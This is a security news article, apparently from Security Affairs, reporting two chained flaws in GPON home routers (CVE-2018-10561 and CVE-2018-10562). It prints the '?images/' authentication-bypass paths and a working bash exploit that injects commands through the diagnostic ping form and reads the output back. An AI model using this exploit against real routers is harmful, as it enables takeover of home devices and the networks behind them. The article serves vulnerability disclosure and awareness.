@@ -1,0 +1,36 @@
+
+					UPDATED – Critical RCE vulnerability found in over a million GPON Home Routers					
+The researchers have found a way to bypass the authentication to access the GPON home routers (CVE-2018-10561). The experts chained this authentication bypass flaw with another command injection vulnerability (CVE-2018-10562) and were able to execute commands on the device.
+
+Analyzing the firmware of the GPON home routers, the experts found two different critical vulnerabilities (CVE-2018-10561 & CVE-2018-10562)  that could be chained to allow complete control of the vulnerable device and therefore the network. The first vulnerability exploits the authentication mechanism of the device, it could be exploited by an attacker to bypass all authentication.
+The vulnerability effects the build in HTTP servers, which check for specific paths when authenticating. This allows the attacker to bypass authentication on any endpoint using a simple trick.
+By appending
+?images/ to the URL
+the attacker can bypass the endpoint.
+This works on both HTML pages and GponForm/
+For instance, by inserting
+/menu.html?images/
+or
+/GponForm/diag_FORM?images/
+the experts were able to control the GPON Home Routers.
+While looking through the device functionalities, the experts noticed the diagnostic endpoint contained the ping and traceroute commands. It didn’t take much to figure out that the commands can be injected using the host parameter.
+“Since the router saves ping results in /tmp and transmits it to the user when the user revisits /diag.html, it’s quite simple to execute commands and retrieve their output with the authentication bypass vulnerability.” reads the analysis published by VPNMentor.
+The experts included the following bash version of the exploit code:
+#!/bin/bash
+
+echo "[+] Sending the Command... "
+“We send the commands with two modes backtick (`) and semicolon (;) because different models trigger on different devices” continues the post:
+curl -k -d "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=\`$2\`;$2&ipv=0" $1/GponForm/diag_Form?images/ 2>/dev/null 1>/dev/null
+echo "[+] Waiting...."
+sleep 3
+echo "[+] Retrieving the ouput...."
+curl -k $1/diag.html?images/ 2>/dev/null | grep 'diag_result = ' | sed -e 's/\\n/\n/g'
+GPON is a very popular passive optical network device that uses fiber-optics, these devices are provided by ISPs. In the video, you can see that over one million people use this type of network system router.
+Below a video PoC published by the researchers:
+ 
+“We tested this vulnerability on many random GPON routers, and the vulnerability was found on all of them. Because so many people use these types of routers, this vulnerability can result in an entire network compromise.” concluded the experts.
+The Italian security expert Federico Valentini (@f3d_0x0), ICT Security researcher at  Cefriel, published a Python exploit for Remote Code Execution on GPON home routers (CVE-2018-10562).
+The PoC code is available on GitHub:
+https://github.com/f3d0x0/GPON
+Pierluigi Paganini
+(Security Affairs – GPON Home Routers, hacking)
